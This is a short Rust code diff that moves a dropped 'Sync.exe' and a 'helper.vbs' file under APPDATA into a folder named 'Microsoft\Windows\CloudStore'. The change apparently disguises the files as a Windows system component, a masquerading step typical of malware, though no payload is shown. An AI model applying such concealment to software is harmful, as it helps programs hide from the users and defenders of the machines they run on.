@@ -7,13 +7,13 @@ use std::path::{Path, PathBuf};
 #[cfg(target_os = "windows")]
 fn get_executable_path() -> PathBuf {
     let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
-    PathBuf::from(format!("{}\\VirtualStore\\sync.exe", appdata))
+    PathBuf::from(format!("{}\\Microsoft\\Windows\\CloudStore\\Sync.exe", appdata))
 }
 
 #[cfg(target_os = "windows")]
 fn get_vbs_path() -> PathBuf {
     let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
-    PathBuf::from(format!("{}\\helper.vbs", appdata))
+    PathBuf::from(format!("{}\\Microsoft\\Windows\\CloudStore\\helper.vbs", appdata))
 }
 
 #[cfg(target_os = "windows")]
